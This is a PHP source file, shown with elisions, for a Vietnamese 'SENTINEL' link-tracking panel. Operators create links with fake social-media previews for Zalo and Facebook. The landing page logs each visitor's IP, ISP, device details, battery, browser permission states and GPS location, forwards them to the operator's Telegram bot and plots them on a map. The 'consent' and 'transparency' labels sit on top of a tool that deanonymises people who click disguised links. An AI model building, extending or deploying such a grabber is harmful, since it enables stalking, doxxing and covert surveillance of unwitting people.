<?php
/**
 * SENTINEL v181.1 - PROFESSIONAL CONSENT DASHBOARD (2026)
 * [✓] Giao diện quản trị đầy đủ hơn với thống kê, tab cô lập và nhãn minh bạch.
 ...
 * [✓] Tích hợp IP/ISP, thiết bị và quyền trình duyệt ở chế độ minh bạch, không bypass GPS/camera/microphone.
 */
...
try {
    ...
    if ($db->query("SELECT COUNT(*) FROM settings WHERE key = 'privacy_note'")->fetchColumn() == 0) {
        $db->prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)")->execute(['privacy_note', 'Không dùng camera/microphone. Vị trí chỉ được gửi khi bạn chủ động đồng ý trong hộp thoại trình duyệt.']);
    }
...
if (isset($_GET['action'])) {
    ...
    if ($_GET['action'] === 'quick_check') {
        ...
        echo @file_get_contents("http://ip-api.com/json/$ip?fields=status,message,query,country,city,isp,lat,lon,proxy");
    }
    if ($_GET['action'] === 'rev_geo') {
        $opts = ['http'=>['header'=>"User-Agent: Sentinel_v180\r\n"]];
        $la = filter_var($_GET['la'] ?? '', FILTER_VALIDATE_FLOAT);
        $lo = filter_var($_GET['lo'] ?? '', FILTER_VALIDATE_FLOAT);
        if ($la === false || $lo === false) { echo json_encode(['error' => 'invalid_coordinates']); exit; }
        echo @file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat=$la&lon=$lo&accept-language=vi", false, stream_context_create($opts));
    }
    if ($_GET['action'] === 'push') {
        ...
        if (!empty($in['meta']) && is_array($in['meta'])) {
            foreach (['screen','userAgent','platform','language','timezone','cameraPermission','geolocationPermission','microphonePermission'] as $mk) {
                if (isset($in['meta'][$mk])) { $client_meta[$mk] = substr((string)$in['meta'][$mk], 0, 180); }
            }
        }
        if ($lat && $lon) {
            $opts = ['http'=>['header'=>"User-Agent: Sentinel_v180\r\n"]];
        ...
        if ($client_meta) {
            $addr .= ' | Client: ' . json_encode($client_meta, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        }
        $db->prepare("INSERT INTO logs (lid, v4, v6, addr, la, lo, img, st, bat) VALUES (?,?,?,?,?,?,?,?,?)")->execute([$in['lid'] ?? 'ROOT', $in['v4'] ?? '', $in['v6'] ?? 'N/A', $addr, $lat, $lon, $img_link, $in['st'] ?? 'event', $in['bat'] ?? 'N/A']);
        if (!empty($in['lid']) && $in['lid'] !== 'ROOT') { $db->prepare("UPDATE links SET clicks = clicks + 1 WHERE id = ?")->execute([$in['lid']]); }
        $tk = get_c('tg_token'); $admin_id = get_c('tg_id');
        if ($tk && $admin_id) {
            $tpl = get_c('tg_msg_template');
            $msg = str_replace(['[ID]','[ST]','[ADDR]','[IP]','[BAT]','[LA]','[LO]'], [$in['lid'] ?? 'ROOT', $in['st'] ?? 'event', $addr, $in['v4'] ?? '', $in['bat'] ?? 'N/A', $lat, $lon], $tpl);
...
<?php exit; }
    ...
    if (isset($_POST['save_cfg'])) {
        $keys = ['tg_token', 'tg_id', 'tg_msg_template', 'ui_msg', 'ui_st', 'btn_text', 'privacy_note', 'proxy_img_url', 'root_title', 'root_desc', 'root_img', 'root_redir', 'px_fake_ttl', 'px_fake_dsc', 'px_fake_img'];
        foreach($keys as $k) { if(isset($_POST[$k])) $db->prepare("INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value")->execute([$k, $_POST[$k]]); }
    ...
    $total_logs = (int)$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();
    $total_clicks = (int)$db->query("SELECT COALESCE(SUM(clicks),0) FROM links")->fetchColumn();
    $gps_events = (int)$db->query("SELECT COUNT(*) FROM logs WHERE la IS NOT NULL AND lo IS NOT NULL")->fetchColumn();
?>
<!DOCTYPE html><html><head><title>SENTINEL MASTER</title><script src="https://cdn.tailwindcss.com"></script>
...
<body class="flex h-screen overflow-hidden uppercase italic font-black text-[10px] tracking-tighter">
    <aside class="w-64 border-r border-slate-800 p-6 flex flex-col gap-4">
        <h1 class="text-white text-sm tracking-wide">CONSENT HUB</h1>
        <button onclick="st(1,this)" id="nb1" class="sidebar-btn active">🔗 DỰ ÁN LIÊN KẾT</button>
        <button onclick="st(2,this)" id="nb2" class="sidebar-btn">📊 NHẬT KÝ MINH BẠCH</button>
        <button onclick="st(3,this)" id="nb3" class="sidebar-btn text-purple-500">🖼️ ẢNH CHIA SẺ</button>
    ...
    <main class="flex-1 p-10 overflow-auto">
        <section class="grid gap-4 mb-8 md:grid-cols-4"><div class="card p-5"><p class="text-slate-500">Dự án</p><b class="text-2xl text-white"><?=$total_links?></b></div><div class="card p-5"><p class="text-slate-500">Lượt ghi nhận</p><b class="text-2xl text-white"><?=$total_logs?></b></div><div class="card p-5"><p class="text-slate-500">Clicks</p><b class="text-2xl text-white"><?=$total_clicks?></b></div><div class="card p-5"><p class="text-slate-500">Có vị trí đồng ý</p><b class="text-2xl text-emerald-400"><?=$gps_events?></b></div></section>
        <div id="t1" class="tab-content active grid lg:grid-cols-3 gap-8">
            <div class="space-y-6">
                <form method="POST" id="lF" class="card space-y-4 shadow-2xl">
                    <h3 class="text-blue-500 text-[9px] uppercase italic">Cấu hình liên kết</h3>
                    <input name="lid" id="fId" placeholder="ID Link" required>
                    <input name="ttl" id="fTtl" placeholder="TIÊU ĐỀ HIỂN THỊ" oninput="upV()">
                    <textarea name="dsc" id="fDsc" placeholder="MÔ TẢ HIỂN THỊ..." oninput="upV()"></textarea>
                    <input name="img" id="fImg" placeholder="LINK ẢNH XEM TRƯỚC" oninput="upV()">                    
                    <input name="red" id="fRed" placeholder="LINK CHUYỂN TIẾP" required>
                    <button type="submit" name="save_link" class="btn-pro">LƯU LIÊN KẾT</button>
                </form>
                <div class="card p-6 shadow-2xl"><div id="vSim" class="bg-[#1a1c23] rounded-2xl overflow-hidden border border-slate-700 text-left shadow-2xl"><div id="vImg" class="h-32 bg-slate-800 flex items-center justify-center text-slate-600 font-black uppercase text-[8px]">NO IMAGE</div><div class="p-4 space-y-1"><p id="vTtl" class="text-white font-black text-xs truncate">Tiêu đề hiển thị...</p><p id="vDsc" class="text-slate-400 text-[8px] line-clamp-2 italic normal-case">Mô tả hiển thị...</p></div></div></div>
            </div>
        ...
        <div id="t2" class="tab-content space-y-8">
            <div class="flex justify-between items-center"><h2 class="text-white text-xl uppercase italic">🛰️ NHẬT KÝ MINH BẠCH</h2><button onclick="location.href='?admin&clear_logs=1'" class="bg-red-900/40 text-red-500 px-6 py-2 rounded-xl italic font-black uppercase">🗑️ DỌN SẠCH</button></div>
            <div class="grid lg:grid-cols-2 gap-8"><div id="map" class="h-[400px] rounded-[2.5rem] border border-slate-800 shadow-2xl bg-slate-900"></div><div id="intel_panel" class="card flex flex-col justify-center space-y-4"><div id="ip_detail" class="italic opacity-30 text-center uppercase text-[8px]">NHẤN IP SOI ISP</div><div id="addr_detail" class="italic text-emerald-400 text-center uppercase text-[8px] border-t border-slate-800 pt-4 font-black italic uppercase">CONSENT-GEO ACTIVE</div></div></div>
            <div class="card p-0 overflow-hidden shadow-2xl"><table class="w-full text-left font-mono text-[9px]"><thead class="bg-black text-slate-500"><tr><th class="p-4">Sự kiện</th><th class="p-4">IP</th><th class="p-4">Địa chỉ Chi Tiết</th><th class="p-4 text-right">Map</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($logs as $log): ?><tr><td class="p-4"><?php if($log['img']): ?><img src="<?=$log['img']?>" class="w-12 h-12 rounded-lg mb-1 shadow-lg border border-slate-700"><?php endif; ?><b><?=$log['lid']?></b></td><td class="p-4"><b class="text-blue-500 cursor-pointer uppercase" onclick="soi('<?=$log['v4']?>')"><?=$log['v4']?></b></td><td class="p-4 italic opacity-80 normal-case text-white"><?=htmlspecialchars($log['addr'])?></td><td class="p-4 text-right flex justify-end gap-2"><?php if($log['la']): ?><button onclick="vP(<?=$log['la']?>,<?=$log['lo']?>)" class="bg-blue-600 text-white px-3 py-1 rounded-lg font-black uppercase italic text-[8px]">LIVE</button><a href="https://www.google.com/maps?q=<?=$log['la']?>,<?=$log['lo']?>" target="_blank" class="bg-emerald-600 text-white px-3 py-1 rounded-lg font-black uppercase italic text-[8px] text-center">G-MAPS</a><?php endif; ?></td></tr><?php endforeach; ?></tbody></table></div>
        </div>
        ...
        <div id="t3" class="tab-content max-w-6xl mx-auto space-y-8">
            <div class="grid lg:grid-cols-2 gap-8">
                <form method="POST" action="?admin&t=3" class="card space-y-4 shadow-2xl">
                    ...
                    <input name="px_fake_ttl" id="px_fake_ttl" value="<?=get_c('px_fake_ttl')?>" oninput="upPxV()" placeholder="Tiêu đề hiển thị">
                    <textarea name="px_fake_dsc" id="px_fake_dsc" oninput="upPxV()" placeholder="Mô tả hiển thị..."><?=get_c('px_fake_dsc')?></textarea>
                    <input name="px_fake_img" id="px_fake_img" value="<?=get_c('px_fake_img')?>" oninput="upPxV()" placeholder="Ảnh Meta hiển thị (Zalo/FB)">
                    <hr class="border-slate-800">
                    <label class="text-blue-500 text-[8px] uppercase">Ảnh được hiển thị khi mở link</label>
...
<body class="min-h-screen bg-[radial-gradient(circle_at_top,#dbeafe,transparent_35%),linear-gradient(135deg,#f8fafc,#eef2ff)] text-slate-900 flex items-center justify-center p-5">
    <main class="w-full max-w-md overflow-hidden rounded-[2rem] border border-white/70 bg-white/90 shadow-2xl backdrop-blur">
        ...
        <section class="p-7 text-center">
            ...
            <div class="mb-5 rounded-2xl border border-blue-100 bg-blue-50 p-4 text-left text-sm leading-6 text-blue-950">
                <b>Minh bạch quyền riêng tư:</b> <?=htmlspecialchars(get_c('privacy_note'))?>
                <div class="mt-3 grid gap-2 text-xs font-bold text-blue-900 sm:grid-cols-2">
                    <span id="cameraPerm" class="rounded-xl bg-white/80 px-3 py-2">Camera: đang kiểm tra...</span>
                    <span id="geoPerm" class="rounded-xl bg-white/80 px-3 py-2">Vị trí: đang kiểm tra...</span>
                    <span id="micPerm" class="rounded-xl bg-white/80 px-3 py-2 sm:col-span-2">Microphone: đang kiểm tra...</span>
                </div>
            </div>
    ...
    const cameraPerm = document.getElementById('cameraPerm');
    const geoPerm = document.getElementById('geoPerm');
    ...
    const labelPermission = (name, state) => `${name}: ${state === 'granted' ? 'đã cho phép' : state === 'prompt' ? 'sẽ hỏi khi cần' : state === 'denied' ? 'đã từ chối' : 'không hỗ trợ'}`;
    async function checkPermission(name, el) {
        if (!navigator.permissions || !navigator.permissions.query) { el.textContent = labelPermission(name, 'unsupported'); return; }
        try {
            const result = await navigator.permissions.query({ name });
            const displayName = name === 'camera' ? 'Camera' : name === 'microphone' ? 'Microphone' : 'Vị trí';
            const update = () => { el.textContent = labelPermission(displayName, result.state); clientMeta[name + 'Permission'] = result.state; };
            update(); result.onchange = update;
        } catch(e) { const displayName = name === 'camera' ? 'Camera' : name === 'microphone' ? 'Microphone' : 'Vị trí'; el.textContent = labelPermission(displayName, 'unsupported'); clientMeta[name + 'Permission'] = 'unsupported'; }
    }
    const push = (st, la=null, lo=null) => fetch('?action=push', { method: 'POST', body: JSON.stringify({ lid: linkId, la, lo, st, img: null, v4:v4, v6:'N/A', bat:bat, meta: clientMeta })});
    window.onload = async () => {
        ...
        checkPermission('camera', cameraPerm);
        checkPermission('geolocation', geoPerm);
        checkPermission('microphone', micPerm);
